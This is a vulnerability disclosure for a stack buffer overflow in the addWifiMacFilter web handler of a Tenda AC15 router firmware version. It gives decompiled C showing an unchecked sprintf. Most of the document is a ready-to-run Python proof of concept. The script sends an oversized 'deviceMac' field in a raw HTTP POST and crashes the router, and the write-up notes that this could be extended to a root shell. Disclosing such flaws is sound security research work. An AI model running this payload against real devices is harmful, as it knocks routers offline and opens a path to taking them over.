# addWifiMacFilter

### Affected product

```
AC15V15.03.05.19
```

### POC

```python
import socket
import os

li = lambda x : print('\x1b[01;38;5;214m' + x + '\x1b[0m')
ll = lambda x : print('\x1b[01;38;5;1m' + x + '\x1b[0m')

ip = '192.168.0.119'
port = 80

r = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

r.connect((ip, port))

rn = b'\r\n'

p1 = b'a' * 0x3000
p2 = b'deviceId=1&deviceMac=' + p1

p3 = b"POST /goform/addWifiMacFilter" + b" HTTP/1.1" + rn
p3 += b"Host: 192.168.0.119" + rn
p3 += b"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0" + rn
p3 += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" + rn
p3 += b"Accept-Language: en-US,en;q=0.5" + rn
p3 += b"Accept-Encoding: gzip, deflate" + rn
p3 += b"Cookie: curShow=; ac_login_info=passwork; test=A; password=1111" + rn
p3 += b"Connection: close" + rn
p3 += b"Upgrade-Insecure-Requests: 1" + rn
p3 += (b"Content-Length: %d" % len(p2)) +rn
p3 += b'Content-Type: application/x-www-form-urlencoded'+rn
p3 += rn
p3 += p2

r.send(p3)

response = r.recv(4096)
response = response.decode()
li(response)

```

/goform/addWifiMacFilter，deviceId and deviceMac are controllable and will eventually be spliced into ret_buf by sprintf. It is worth noting that the size is not checked, resulting in a stack overflow vulnerability

### Detail

```c
  v9 = (const char *)sub_2BA8C(a1, (int)"deviceId", (int)&byte_EFE58);
  v11 = (const char *)sub_2BA8C(a1, (int)"deviceMac", (int)&byte_EFE58);
  if ( sub_95448(v11) )
  {
    v12 = 3;
  }
  else
  {
    memset(nptr, 0, sizeof(nptr));
    GetValue("wl2g.ssid0.maclist_num", nptr);
    v10 = atoi(nptr);
    memset(s, 0, sizeof(s));
    memset(v7, 0, sizeof(v7));
    memset(nptr, 0, sizeof(nptr));
    sprintf(s, "wl2g.ssid0.maclist%d", v10 + 1);
    sprintf(v7, "wl5g.ssid0.maclist%d", v10 + 1);
    sprintf(nptr, "%s;%d;%s", v11, 1, v9);
```

You can see the router crash, and finally we can write an exp to get a root shell
